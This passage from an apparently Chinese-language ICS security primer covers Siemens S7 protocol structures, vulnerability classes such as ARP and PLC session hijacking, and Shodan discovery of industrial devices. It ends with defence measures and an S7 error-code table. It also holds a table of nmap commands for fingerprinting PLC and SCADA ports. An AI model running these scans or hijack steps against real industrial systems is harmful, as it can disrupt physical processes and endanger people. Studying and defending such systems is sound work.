Data</td></tr><tr><td style="text-align:center">Fill byte（填充字节，如果数据的长度不满足 Length 的话，填充 0x00）</td><td style="text-align:center">/</td><td style="text-align:center">/</td></tr></tbody></table><ul><li>0x05（Write Var）：写入值<ul><li>写数据操作，通过指定变量的存储区域，地址（偏移量）及其大小或类型来执行。大部分和 Read Var 的结构相同，只是多了写的 Data 结构。</li></ul></li><li>0x1a（Request download）：请求下载</li></ul><p>当 PDU 类型是 JOB 时，结构如下：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function（函数声明）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Unknown byte(s) in blockcontrol（blockcontrol 中的所有未知字节）</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Unknown byte(s) in blockcontrol（无意义，一般为 0x00000000）</td><td style="text-align:center">4</td><td style="text-align:center">4</td></tr><tr><td style="text-align:center">Filename Length（文件名长度）</td><td style="text-align:center">8</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Filename（文件名）</td><td style="text-align:center">9</td><td style="text-align:center">9</td></tr></tbody></table><p>其中文件名结构如下：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">File identifier（文件标识符，<code>_</code>——Complete Module、<code>$</code>——Module header for up-loading 两种）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><a href="#西门子设备中-8-种不同类型的功能块">Block type</a>（块类型，西门子设备中有 8 种不同类型的功能块）</td><td style="text-align:center">1</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Block number（请求的块编号）</td><td style="text-align:center">3</td><td style="text-align:center">5</td></tr><tr><td style="text-align:center"><a href="#请求下载的目标文件系统类型">Destination filesystem</a>（请求的目标文件系统）</td><td style="text-align:center">8</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Length part（接下来的字段长度）</td><td style="text-align:center">18</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Unknown char before load mem（加载 mem 之前的未知字符）</td><td style="text-align:center">19</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Length of load memory（装载长度）</td><td style="text-align:center">20</td><td style="text-align:center">6</td></tr><tr><td style="text-align:center">Length of MC7 code（MC7 代码长度）</td><td style="text-align:center">26</td><td style="text-align:center">6</td></tr></tbody></table><p>当 PDU 类型是 ACK_DATA，Parameter 部分仅有一个 Function 字段。</p><ul><li>0x1b（Download block）：下载块<ul><li>和 Request download 相比少了目标文件系统后面的部分。Parameter 内容仅有 Function 确认和 Function 状态，但是多出了 Data 结构，内容主要为数据长度、未知字节以及数据内容，数据内容的长度。</li></ul></li><li>0x1c（Download ended）：下载结束<ul><li>结构和 Download block 类似。Parameter 中只有一个 Function 确认。</li></ul></li><li>0x1d（Start upload）：开始上传<ul><li>和 Request download 的前部分结构一致。</li></ul></li></ul><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function（函数声明）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Function Status（功能状态，包含错误是否发生、是否使用另一个检索块/文件来请求）</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Unknown byte(s) in blockcontrol（blockcontrol 中的所有未知字节）</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">UploadID（上传文件会话的 ID）</td><td style="text-align:center">4</td><td style="text-align:center">4</td></tr><tr><td style="text-align:center">Blocklengthstring Length（块长字符串后的字节长度）</td><td style="text-align:center">8</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Blocklength（完整上传块的长度（以字节为单位），可以拆分为多个 PDU）</td><td style="text-align:center">9</td><td style="text-align:center">7</td></tr></tbody></table><ul><li>0x1e（Upload）：上传</li></ul><p>当 PDU 类型为 JOB 时，Upload 结构中没有 Data，Parameter 的结构如下（和 Start upload 类似）：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function（函数声明）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Function Status（功能状态，包含错误是否发生、是否使用另一个检索块/文件来请求）</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Unknown byte(s) in blockcontrol（blockcontrol 中的所有未知字节）</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">UploadID（上传文件会话的 ID）</td><td style="text-align:center">4</td><td style="text-align:center">4</td></tr></tbody></table><ul><li>0x1f（End upload）：上传结束<ul><li>当 PDU 类型为 JOB 时，结构和 Upload 相同；</li><li>当 PDU 类型为 ACK_DATA 时，仅有一个功能确认的结构。</li></ul></li><li>0x28（PI-Service）：程序调用服务<ul><li>用于 PLC 修改执行/内存状态的日常工作。这些命令可以用于启动或停止 PLC 控制程序、激活或删除程序块。</li></ul></li></ul><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function（函数声明）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Unknown bytes（未知字节）</td><td style="text-align:center">1</td><td style="text-align:center">7</td></tr><tr><td style="text-align:center">Parameter block length（参数块长度）</td><td style="text-align:center">8</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">String length（PI service 的字符串长度）</td><td style="text-align:center">12</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><a href="#程序调用服务名">PI (program invocation) Service</a>（程序调用服务名）</td><td style="text-align:center">13</td><td style="text-align:center">9</td></tr></tbody></table><ul><li>0x29（PLC Stop）：关闭 PLC<ul><li>机构和 PI-Service 一致。</li></ul></li></ul><h2 id="其他工控协议"><a href="#其他工控协议" class="headerlink" title="其他工控协议"></a>其他工控协议</h2><p>IEC 60870-5-104、EtherNet/IP、Tridium Niagara Fox、Crimson V3、OMRON FINS、PCWorx、ProConOs、MELSEC-Q 等。</p><h2 id="工控协议仿真资源"><a href="#工控协议仿真资源" class="headerlink" title="工控协议仿真资源"></a>工控协议仿真资源</h2><ul><li>Modbus 协议<ul><li>ModSim、ModScan、mod_RSsim</li></ul></li><li>西门子 S7 协议<ul><li>snap7 client、snap7 server</li></ul></li><li>IEC104 协议<ul><li>PMA 规约分析软件</li></ul></li><li>DNP3 协议<ul><li>opendnp3 Simulator</li></ul></li><li>IEC61850 协议<ul><li>Protocol Test Harness</li></ul></li><li>BACnet 协议<ul><li>BACnet Server</li></ul></li><li>OPC UA 和 OPC DA 协议<ul><li>KEPServerEX、UAEXpect</li></ul></li></ul><h1 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h1><p>除了上面讲的协议部分，其他还有很多方面存在漏洞。</p><h2 id="Code-Logic-Vulnerability-in-PLC"><a href="#Code-Logic-Vulnerability-in-PLC" class="headerlink" title="Code Logic Vulnerability in PLC"></a>Code Logic Vulnerability in PLC</h2><p>工控编程是工控系统运行的核心和重点：</p><ul><li>工控编程核心为明白工控业务逻辑，而工控编程遵循 IEC61131-3（工控史上首例实现 PLC、DCS、运动控制、 SCADA 等联合编程的标准——IEC61131-3），包括 5 种编程语言标准，3 种是图形化语言（梯形图、顺序功能图和功能块图），两种是文本化语言（指令表和结构文本）。</li><li>工控设备往往可以在线调试，从而可以控制某些输入输出端口，实现强制启停的功能，如果这些功能可以采用 Remote 方式重发，那攻击危害就更为严重。</li><li>工控设备的连接方式多样，一般采用串口，但是目前设备发展支持以太网、USB 接口等新的方式，如果网口不行试试串口、USB。</li><li>工控组态可以非常复杂，甚至连接成百上千个输入输出都有可能，组态中会由于添加了新的组件而更加麻烦，这时候要慢慢看，一点一点缕出来。</li></ul><h3 id="PLC-代码逻辑漏洞"><a href="#PLC-代码逻辑漏洞" class="headerlink" title="PLC 代码逻辑漏洞"></a>PLC 代码逻辑漏洞</h3><ul><li>计算逻辑漏洞</li><li>看门狗超时漏洞</li><li>缓冲区溢出漏洞</li></ul><h2 id="Communication-Hijack"><a href="#Communication-Hijack" class="headerlink" title="Communication Hijack"></a>Communication Hijack</h2><p>通信劫持是工控场景中最经典利用方式，例如 ARP 劫持、PLC/HMI 通信劫持、PLC 会话劫持、PLC 命令执行等内容。通信劫持的方法：</p><ul><li>ARP 劫持，ARP 劫持可以阻断 PLC 与其他设备的通信，鉴于工程会存在写死 IP 等交互地址，未必管用，但是值得一试；</li><li>PLC/HMI 通信劫持，采用旁路设备接入或控制 PLC 设备，对 IO 进行强制重写或输出；</li><li>PLC 命令执行，针对工控设备最敏感的部分是设备宕机（无法恢复的）、设备启停、设备强制更新参数，等等这些对普通工艺能够产生较大的影响。</li></ul><h3 id="工业以太网链路漏洞"><a href="#工业以太网链路漏洞" class="headerlink" title="工业以太网链路漏洞"></a>工业以太网链路漏洞</h3><ul><li>MAC 泛洪攻击</li><li>ARP 溢出/中间人攻击</li><li>环网 Beacon 协议攻击</li><li>VLAN 跳转攻击</li><li>交换机 WEB 漏洞攻击</li></ul><h2 id="Host-Security-Vulnerability"><a href="#Host-Security-Vulnerability" class="headerlink" title="Host Security Vulnerability"></a>Host Security Vulnerability</h2><p>主机上可能会自带的漏洞：</p><ul><li>防火墙关闭</li><li>没有杀毒软件防护</li><li>缺乏 USB 准入</li><li>Windows 本身的漏洞<ul><li>SMB v1.0 Port 445</li><li>RDP Port 3389</li><li>AD 域攻击</li><li>DNS 污染攻击</li></ul></li></ul><p><img src="/pics/工控安全基础概念初探/4.png" srcset="/img/loading.gif" alt></p><h2 id="Vulnerability-in-SCADA"><a href="#Vulnerability-in-SCADA" class="headerlink" title="Vulnerability in SCADA"></a>Vulnerability in SCADA</h2><ul><li>DoS 拒绝式服务攻击</li><li>缓冲区溢出漏洞</li><li>COM 服务组件未授权访问漏洞</li><li>SQL 数据库注入的漏洞</li></ul><h2 id="Physical-Security-Vulnerability"><a href="#Physical-Security-Vulnerability" class="headerlink" title="Physical Security Vulnerability"></a>Physical Security Vulnerability</h2><ul><li>设备所在地无防护</li><li>机房机柜未上锁</li><li>网络端口未加固</li><li>控制器钥匙未拔出</li><li>供电电源为单路</li><li>接地系统不完善</li></ul><h1 id="Firmware-Reversing"><a href="#Firmware-Reversing" class="headerlink" title="Firmware Reversing"></a>Firmware Reversing</h1><p>工具：</p><ul><li>Binwalk</li><li>BAT（Binary Analysis Toolkit）</li><li>…</li></ul><table><thead><tr><th style="text-align:center">Device</th><th style="text-align:center">Vendor</th><th style="text-align:center">OS</th><th style="text-align:center">Binwalk</th><th style="text-align:center">BAT</th></tr></thead><tbody><tr><td style="text-align:center">Camera</td><td style="text-align:center">STL</td><td style="text-align:center">Linux</td><td style="text-align:center">不支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">Router</td><td style="text-align:center">Bintec</td><td style="text-align:center">-</td><td style="text-align:center">不支持</td><td style="text-align:center">不支持</td></tr><tr><td style="text-align:center">ADSL Gateway</td><td style="text-align:center">Zyxel</td><td style="text-align:center">ZynOS</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">PLC</td><td style="text-align:center">Siemens</td><td style="text-align:center">-</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">DSLAM</td><td style="text-align:center">-</td><td style="text-align:center">-</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">PC</td><td style="text-align:center">Intel</td><td style="text-align:center">BIOS</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">ISDN Server</td><td style="text-align:center">Planet</td><td style="text-align:center">-</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">Voip</td><td style="text-align:center">Asotel</td><td style="text-align:center">Vxworks</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">Modem</td><td style="text-align:center">-</td><td style="text-align:center">-</td><td style="text-align:center">不支持</td><td style="text-align:center">不支持</td></tr><tr><td style="text-align:center">Home Automation</td><td style="text-align:center">Belkin</td><td style="text-align:center">Linux</td><td style="text-align:center">不支持</td><td style="text-align:center">不支持</td></tr></tbody></table><h1 id="Discovering"><a href="#Discovering" class="headerlink" title="Discovering"></a>Discovering</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>使用 Shodan 几乎可以搜索到网络上所有的 PLC、SCADA 等设备。</p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>目前针对工控设备扫描中，在 Nmap、Metasploit、Censes 集成了大量的工具，用于挖掘当前在线 PLC、DCS 等 ICS 设备。</p><h3 id="基于端口"><a href="#基于端口" class="headerlink" title="基于端口"></a>基于端口</h3><table><thead><tr><th style="text-align:center">端口</th><th style="text-align:center">协议 / 设备</th><th style="text-align:center">来源</th></tr></thead><tbody><tr><td style="text-align:center">102（TCP）</td><td style="text-align:center">Siemens S7</td><td style="text-align:center"><code>nmap --script s7-info.nse -p 102 [HOST]</code> \ <code>nmap -sP --script s71200-enumerate-old.nse -p 102 [HOST]</code></td></tr><tr><td style="text-align:center">502（TCP）</td><td style="text-align:center">Modbus</td><td style="text-align:center"><code>nmap --script modicon-info -p 502 [HOST]</code></td></tr><tr><td style="text-align:center">2404（TCP）</td><td style="text-align:center">IEC 60870-5-104</td><td style="text-align:center"><code>nmap -Pn -n -d --script iec-identify.nse --script-args=&#39;iec-identify.timeout=500&#39; -p 2404 [HOST]</code></td></tr><tr><td style="text-align:center">20000（TCP）</td><td style="text-align:center">DNP3</td><td style="text-align:center"><code>nmap -sT --script dnp3-enumerate.nse -p 20000 [HOST]</code> / <code>nmap --script dnp3-info -p 20000 [HOST]</code></td></tr><tr><td style="text-align:center">44818（TCP）</td><td style="text-align:center">Ethernet/IP</td><td style="text-align:center"><code>nmap --script enip-enumerate -sU -p 44818 [HOST]</code></td></tr><tr><td style="text-align:center">47808（UDP）</td><td style="text-align:center">BACnet</td><td style="text-align:center"><code>nmap --script BACnet-discover-enumerate.nse -sU -p 47808 [HOST]</code></td></tr><tr><td style="text-align:center">1911（TCP）</td><td style="text-align:center">Tridium Nixagara Fo</td><td style="text-align:center"><code>nmap --script fox-info.nse -p 1911 [HOST]</code></td></tr><tr><td style="text-align:center">789（TCP）</td><td style="text-align:center">Crimson V3</td><td style="text-align:center"><code>nmap --script cr3-fingerprint.nse -p 789 [HOST]</code></td></tr><tr><td style="text-align:center">9600（TCP）</td><td style="text-align:center">OMRON FINS</td><td style="text-align:center"><code>nmap --script omrontcp-info -p 9600 [HOST]</code></td></tr><tr><td style="text-align:center">1962（TCP）</td><td style="text-align:center">PCWorx</td><td style="text-align:center"><code>nmap --script pcworx-info -p 1962 [HOST]</code></td></tr><tr><td style="text-align:center">20547（TCP）</td><td style="text-align:center">ProConOs</td><td style="text-align:center"><code>nmap --script proconos-info -p 20547</code></td></tr><tr><td style="text-align:center">5007（TCP）</td><td style="text-align:center">Melsec-Q</td><td style="text-align:center"><code>nmap --script melsecq-discover -sT -p 5007 [HOST]</code></td></tr><tr><td style="text-align:center">5006</td><td style="text-align:center">Melsec-Q</td><td style="text-align:center"><code>nmap --script melsecq-discover-udp.nse -sU -p 5006 [HOST]</code></td></tr><tr><td style="text-align:center">1200（TCP）</td><td style="text-align:center">Codesys</td><td style="text-align:center"><code>nmap --script codesys-v2-discover.nse [HOST]</code></td></tr><tr><td style="text-align:center">10001</td><td style="text-align:center">ATG</td><td style="text-align:center"><code>nmap --script atg-info -p 10001 [HOST]</code></td></tr></tbody></table><h3 id="基于组态软件的组件"><a href="#基于组态软件的组件" class="headerlink" title="基于组态软件的组件"></a>基于组态软件的组件</h3><table><thead><tr><th style="text-align:center">端口</th><th style="text-align:center">协议 / 设备</th><th style="text-align:center">连接方法</th></tr></thead><tbody><tr><td style="text-align:center">102（TCP）</td><td style="text-align:center">Siemens S7</td><td style="text-align:center">西门子软件 Step7 自带扫描当前网段 PLC 设备功能</td></tr><tr><td style="text-align:center">502（TCP）</td><td style="text-align:center">Modbus</td><td style="text-align:center">施耐德 SoMachine Basic 连接 PLC 设备自带扫描内网网段功能</td></tr></tbody></table><h1 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h1><p>工业控制系统安全防御：</p><ul><li>区域边界<ul><li>工业防火墙</li><li>区域防火墙</li><li>网闸</li></ul></li><li>网络安全<ul><li>交换机空余端口关闭</li><li>Native VLAN</li><li>禁用 CDP 或 LLDP</li><li>握手报文加密</li></ul></li><li>主机安全<ul><li>杀毒软件</li><li>防火墙</li><li>基线安全</li><li>USB 口准入</li><li>应用白名单</li></ul></li><li>控制器安全<ul><li>协议加密</li><li>准入控制</li><li>身份认证</li></ul></li><li>物理安全<ul><li>接地安全</li><li>双路供电</li><li>电柜上锁</li></ul></li></ul><h1 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h1><h2 id="错误码的含义"><a href="#错误码的含义" class="headerlink" title="错误码的含义"></a>错误码的含义</h2><table><thead><tr><th style="text-align:center">错误码</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">0x0000</td><td style="text-align:center">没有错误</td></tr><tr><td style="text-align:center">0x0110</td><td style="text-align:center">块号无效</td></tr><tr><td style="text-align:center">0x0111</td><td style="text-align:center">请求长度无效</td></tr><tr><td style="text-align:center">0x0112</td><td style="text-align:center">参数无效</td></tr><tr><td style="text-align:center">0x0113</td><td style="text-align:center">块类型无效</td></tr><tr><td style="text-align:center">0x0114</td><td style="text-align:center">找不到块</td></tr><tr><td style="text-align:center">0x0115</td><td style="text-align:center">块已存在</td></tr><tr><td style="text-align:center">0x0116</td><td style="text-align:center">块被写保护</td></tr><tr><td style="text-align:center">0x0117</td><td style="text-align:center">块/操作系统更新太大</td></tr><tr><td style="text-align:center">0x0118</td><td style="text-align:center">块号无效</td></tr><tr><td style="text-align:center">0x0119</td><td style="text-align:center">输入的密码不正确</td></tr><tr><td style="text-align:center">0x011A</td><td style="text-align:center">PG 资源错误</td></tr><tr><td style="text-align:center">0x011B</td><td style="text-align:center">PLC 资源错误</td></tr><tr><td style="text-align:center">0x011C</td><td style="text-align:center">协议错误</td></tr><tr><td style="text-align:center">0x011D</td><td style="text-align:center">块太多（与模块相关的限制）</td></tr><tr><td style="text-align:center">0x011E</td><td style="text-align:center">不再与数据库建立连接，或者 S7DOS 句柄无效</td></tr><tr><td style="text-align:center">0x011F</td><td style="text-align:center">结果缓冲区太小</td></tr><tr><td style="text-align:center">0x0120</td><td style="text-align:center">块结束列表</td></tr><tr><td style="text-align:center">0x0140</td><td style="text-align:center">可用内存不足</td></tr><tr><td style="text-align:center">0x0141</td><td style="text-align:center">由于缺少资源，无法处理作业</td></tr><tr><td style="text-align:center">0x8001</td><td style="text-align:center">当块处于当前状态时，无法执行请求的服务</td></tr><tr><td style="text-align:center">0x8003</td><td style="text-align:center">S7 协议错误：传输块时发生错误</td></tr><tr><td style="text-align:center">0x8100</td><td style="text-align:center">应用程序，一般错误：远程模块未知的服务</td></tr><tr><td style="text-align:center">0x8104</td><td style="text-align:center">未在模块上实现此服务或报告了帧错误</td></tr><tr><td style="text-align:center">0x8204</td><td style="text-align:center">对象的类型规范不一致</td></tr><tr><td style="text-align:center">0x8205</td><td style="text-align:center">复制的块已存在且未链接</td></tr><tr><td style="text-align:center">0x8301</td><td style="text-align:center">模块上的内存空间或工作内存不足，或者指定的存储介质不可访问</td></tr><tr><td style="text-align:center">0x8302</td><td style="text-align:center">可用资源太少或处理器资源不可用</td></tr><tr><td style="text-align:center">0x8304</td><td style="text-align:center">无法进一步并行上传。存在资源瓶颈</td></tr><tr><td style="text-align:center">0x8305</td><td style="text-align:center">功能不可用</td></tr><tr><td style="text-align:center">0x8306</td><td style="text-align:center">工作内存不足（用于复制，链接，加载 AWP）</td></tr><tr><td style="text-align:center">0x8307</td><td style="text-align:center">保持性工作记忆不够（用于复制，链接，加载 AWP）</td></tr><tr><td style="text-align:center">0x8401</td><td style="text-align:center">S7 协议错误：无效的服务序列（例如，加载或上载块）</td></tr><tr><td style="text-align:center">0x8402</td><td style="text-align:center">由于寻址对象的状态，服务无法执行</td></tr><tr><td style="text-align:center">0x8404</td><td style="text-align:center">S7 协议：无法执行该功能</td></tr><tr><td style="text-align:center">0x8405</td><td style="text-align:center">远程块处于 DISABLE 状态（CFB）。该功能无法执行</td></tr><tr><td style="text-align:center">0x8500</td><td style="text-align:center">S7 协议错误：帧错误</td></tr><tr><td style="text-align:center">0x8503</td><td style="text-align:center">来自模块的警报：服务过早取消</td></tr><tr><td style="text-align:center">0x8701</td><td style="text-align:center">寻址通信伙伴上的对象时出错（例如，区域长度错误）</td></tr><tr><td style="text-align:center">0x8702</td><td style="text-align:center">模块不支持所请求的服务</td></tr><tr><td style="text-align:center">0x8703</td><td style="text-align:center">拒绝访问对象</td></tr><tr><td style="text-align:center">0x8704</td><td style="text-align:center">访问错误：对象已损坏</td></tr><tr><td style="text-align:center">0xD001</td><td style="text-align:center">协议错误：非法的作业号</td></tr><tr><td style="text-align:center">0xD002</td><td style="text-align:center">参数错误：非法的作业变体</td></tr><tr><td style="text-align:center">0xD003</td><td style="text-align:center">参数错误：模块不支持调试功能</td></tr><tr><td style="text-align:center">0xD004</td><td style="text-align:center">参数错误：作业状态非法</td></tr><tr><td style="text-align:center">0xD005</td><td style="text-align:center">参数错误：作业终止非法</td></tr><tr><td style="text-align:center">0xD006</td><td style="text-align:center">参数错误：非法链路断开 ID</td></tr><tr><td style="text-align:center">0xD007</td><td style="text-align:center">参数错误：缓冲区元素数量非法</td></tr><tr><td style="text-align:center">0xD008</td><td style="text-align:center">参数错误：扫描速率非法</td></tr><tr><td style="text-align:center">0xD009</td><td style="text-align:center">参数错误：执行次数非法</td></tr><tr><td style="text-align:center">0xD00A</td><td style="text-align:center">参数错误：非法触发事件</td></tr><tr><td style="text-align:center">0xD00B</td><td style="text-align:center">参数错误：非法触发条件</td></tr><tr><td style="text-align:center">0xD011</td><td style="text-align:center">调用环境路径中的参数错误：块不存在</td></tr><tr><td style="text-align:center">0xD012</td><td style="text-align:center">参数错误：块中的地址错误</td></tr><tr><td style="text-align:center">0xD014</td><td style="text-align:center">参数错误：正在删除/覆盖块</td></tr><tr><td style="text-align:center">0xD015</td><td style="text-align:center">参数错误：标签地址非法</td></tr><tr><td style="text-align:center">0xD016</td><td style="text-align:center">参数错误：由于用户程序错误，无法测试作业</td></tr><tr><td style="text-align:center">0xD017</td><td style="text-align:center">参数错误：非法触发号</td></tr><tr><td style="text-align:center">0xD025</td><td style="text-align:center">参数错误：路径无效</td></tr><tr><td style="text-align:center">0xD026</td><td style="text-align:center">参数错误：非法访问类型</td></tr><tr><td style="text-align:center">0xD027</td><td style="text-align:center">参数错误：不允许此数据块数</td></tr><tr><td style="text-align:center">0xD031</td><td style="text-align:center">内部协议错误</td></tr><tr><td style="text-align:center">0xD032</td><td style="text-align:center">参数错误：结果缓冲区长度错误</td></tr><tr><td style="text-align:center">0xD033</td><td style="text-align:center">协议错误：作业长度错误</td></tr><tr><td style="text-align:center">0xD03F</td><td style="text-align:center">编码错误：参数部分出错（例如，保留字节不等于 0）</td></tr><tr><td style="text-align:center">0xD041</td><td style="text-align:center">数据错误：非法状态列表 ID</td></tr><tr><td style="text-align:center">0xD042</td><td style="text-align:center">数据错误：标签地址非法</td></tr><tr><td style="text-align:center">0xD043</td><td style="text-align:center">数据错误：找不到引用的作业，检查作业数据</td></tr><tr><td style="text-align:center">0xD044</td><td style="text-align:center">数据错误：标签值非法，检查作业数据</td></tr><tr><td style="text-align:center">0xD045</td><td style="text-align:center">数据错误：HOLD 中不允许退出 ODIS 控制</td></tr><tr><td style="text-align:center">0xD046</td><td style="text-align:center">数据错误：运行时测量期间非法测量阶段</td></tr><tr><td style="text-align:center">0xD047</td><td style="text-align:center">数据错误：“读取作业列表”中的非法层次结构</td></tr><tr><td style="text-align:center">0xD048</td><td style="text-align:center">数据错误：“删除作业”中的非法删除 ID</td></tr><tr><td style="text-align:center">0xD049</td><td style="text-align:center">“替换作业”中的替换 ID 无效</td></tr><tr><td style="text-align:center">0xD04A</td><td style="text-align:center">执行’程序状态’时出错</td></tr><tr><td style="text-align:center">0xD05F</td><td style="text-align:center">编码错误：数据部分出错（例如，保留字节不等于 0，…）</td></tr><tr><td style="text-align:center">0xD061</td><td style="text-align:center">资源错误：没有作业的内存空间</td></tr><tr><td style="text-align:center">0xD062</td><td style="text-align:center">资源错误：作业列表已满</td></tr><tr><td style="text-align:center">0xD063</td><td style="text-align:center">资源错误：触发事件占用</td></tr><tr><td style="text-align:center">0xD064</td><td style="text-align:center">资源错误：没有足够的内存空间用于一个结果缓冲区元素</td></tr><tr><td style="text-align:center">0xD065</td><td style="text-align:center">资源错误：没有足够的内存空间用于多个结果缓冲区元素</td></tr><tr><td style="text-align:center">0xD066</td><td style="text-align:center">资源错误：可用于运行时测量的计时器被另一个作业占用</td></tr><tr><td style="text-align:center">0xD067</td><td style="text-align:center">资源错误：“修改标记”作业过多（特别是多处理器操作）</td></tr><tr><td style="text-align:center">0xD081</td><td style="text-align:center">当前模式下不允许使用的功能</td></tr><tr><td style="text-align:center">0xD082</td><td style="text-align:center">模式错误：无法退出 HOLD 模式</td></tr><tr><td style="text-align:center">0xD0A1</td><td style="text-align:center">当前保护级别不允许使用的功能</td></tr><tr><td style="text-align:center">0xD0A2</td><td style="text-align:center">目前无法运行，因为正在运行的函数会修改内存</td></tr><tr><td style="text-align:center">0xD0A3</td><td style="text-align:center">I / O 上活动的“修改标记”作业太多（特别是多处理器操作）</td></tr><tr><td style="text-align:center">0xD0A4</td><td style="text-align:center">‘强制’已经建立</td></tr><tr><td style="text-align:center">0xD0A5</td><td style="text-align:center">找不到引用的作业</td></tr><tr><td style="text-align:center">0xD0A6</td><td style="text-align:center">无法禁用/启用作业</td></tr><tr><td style="text-align:center">0xD0A7</td><td style="text-align:center">无法删除作业，例如因为当前正在读取作业</td></tr><tr><td style="text-align:center">0xD0A8</td><td style="text-align:center">无法替换作业，例如因为当前正在读取或删除作业</td></tr><tr><td style="text-align:center">0xD0A9</td><td style="text-align:center">无法读取作业，例如因为当前正在删除作业</td></tr><tr><td style="text-align:center">0xD0AA</td><td style="text-align:center">处理操作超出时间限制</td></tr><tr><td style="text-align:center">0xD0AB</td><td style="text-align:center">进程操作中的作业参数无效</td></tr><tr><td style="text-align:center">0xD0AC</td><td style="text-align:center">进程操作中的作业数据无效</td></tr><tr><td style="text-align:center">0xD0AD</td><td style="text-align:center">已设置操作模式</td></tr><tr><td style="text-align:center">0xD0AE</td><td style="text-align:center">作业是通过不同的连接设置的，只能通过此连接进行处理</td></tr><tr><td style="text-align:center">0xD0C1</td><td style="text-align:center">访问标签时至少检测到一个错误</td></tr><tr><td style="text-align:center">0xD0C2</td><td style="text-align:center">切换到 STOP / HOLD 模式</td></tr><tr><td style="text-align:center">0xD0C3</td><td style="text-align:center">访问标记时至少检测到一个错误。模式更改为 STOP / HOLD</td></tr><tr><td style="text-align:center">0xD0C4</td><td style="text-align:center">运行时测量期间超时</td></tr><tr><td style="text-align:center">0xD0C5</td><td style="text-align:center">块堆栈的显示不一致，因为块被删除/重新加载</td></tr><tr><td style="text-align:center">0xD0C6</td><td style="text-align:center">作业已被删除，因为它所引用的作业已被删除</td></tr><tr><td style="text-align:center">0xD0C7</td><td style="text-align:center">由于退出了 STOP 模式，因此作业被自动删除</td></tr><tr><td style="text-align:center">0xD0C8</td><td style="text-align:center">由于测试作业和正在运行的程序之间不一致，“块状态”中止</td></tr><tr><td style="text-align:center">0xD0C9</td><td style="text-align:center">通过复位 OB90 退出状态区域</td></tr><tr><td style="text-align:center">0xD0CA</td><td style="text-align:center">通过在退出前重置 OB90 并访问错误读取标签退出状态范围</td></tr><tr><td style="text-align:center">0xD0CB</td><td style="text-align:center">外设输出的输出禁用再次激活</td></tr><tr><td style="text-align:center">0xD0CC</td><td style="text-align:center">调试功能的数据量受时间限制</td></tr><tr><td style="text-align:center">0xD201</td><td style="text-align:center">块名称中的语法错误</td></tr><tr><td style="text-align:center">0xD202</td><td style="text-align:center">函数参数中的语法错误</td></tr><tr><td style="text-align:center">0xD205</td><td style="text-align:center">RAM 中已存在链接块：无法进行条件复制</td></tr><tr><td style="text-align:center">0xD206</td><td style="text-align:center">EPROM 中已存在链接块：无法进行条件复制</td></tr><tr><td style="text-align:center">0xD208</td><td style="text-align:center">超出模块的最大复制（未链接）块数</td></tr><tr><td style="text-align:center">0xD209</td><td style="text-align:center">（至少）模块上找不到给定块之一</td></tr><tr><td style="text-align:center">0xD20A</td><td style="text-align:center">超出了可以与一个作业链接的最大块数</td></tr><tr><td style="text-align:center">0xD20B</td><td style="text-align:center">超出了一个作业可以删除的最大块数</td></tr><tr><td style="text-align:center">0xD20C</td><td style="text-align:center">OB 无法复制，因为关联的优先级不存在</td></tr><tr><td style="text-align:center">0xD20D</td><td style="text-align:center">SDB 无法解释（例如，未知数）</td></tr><tr><td style="text-align:center">0xD20E</td><td style="text-align:center">没有（进一步）阻止可用</td></tr><tr><td style="text-align:center">0xD20F</td><td style="text-align:center">超出模块特定的最大块大小</td></tr><tr><td style="text-align:center">0xD210</td><td style="text-align:center">块号无效</td></tr><tr><td style="text-align:center">0xD212</td><td 